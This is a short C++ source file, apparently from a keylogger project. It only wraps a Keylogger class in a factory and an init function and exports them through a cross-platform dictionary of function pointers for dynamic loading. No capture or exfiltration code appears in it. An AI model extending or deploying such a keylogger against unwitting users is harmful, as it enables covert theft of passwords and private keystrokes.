#include				"keylogger_dll\KeyloggerDLL.h"

Keylogger*				instantiate()
{
	Keylogger*			keylogger = new Keylogger();
	return keylogger;
}

bool					initKeylogger(Keylogger* keylogger)
{
	return keylogger->init();
}

extern "C" {
#ifdef __linux__
	Dictionary	getDictionary(void)
#elif _WIN32
	__declspec(dllexport) Dictionary	__cdecl getDictionary(void)
#endif
	{
		Dictionary	dict = new std::map<std::string, void *>;

		// List every usefull functions out there
		(*dict)["instantiate"] = (void *)&instantiate;
		(*dict)["initKeylogger"] = (void*)&initKeylogger;

		return (dict);
	}
}
